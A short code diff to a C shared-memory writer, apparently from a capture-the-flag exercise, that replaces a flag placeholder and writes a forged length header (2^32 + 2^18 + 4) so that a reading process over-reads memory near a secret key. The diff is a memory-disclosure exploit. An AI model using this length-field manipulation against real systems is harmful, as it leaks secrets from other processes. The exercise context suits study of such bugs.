@@ -23,7 +23,7 @@ int main(int argc, char *argv[]) {
         return 10;
     }
 
-    char * to_write = "PLACEHOLDERREPLACEMEWITHREALFLAG";
+    char * to_write = "abc2";
 
     // map shared memory to process address space
     addr = mmap(NULL, STORAGE_SIZE, PROT_WRITE, MAP_SHARED, fd, 0);
@@ -35,9 +35,9 @@ int main(int argc, char *argv[]) {
 
     p = addr;
     len = strlen(to_write);
-
+    size_t actual_len = 4295229444; // 2^32 (needed to read the process memory after the mmap'ed region) + 2^18 (needed to mmap near to the secret key) + 2^2 ("abc2" length)
     //write the length of the message to the header
-    memcpy(p, &len, sizeof(size_t));
+    memcpy(p, &actual_len, sizeof(size_t));
     p += sizeof(size_t);
     //write the data to the memory
     memcpy(p, to_write, len);
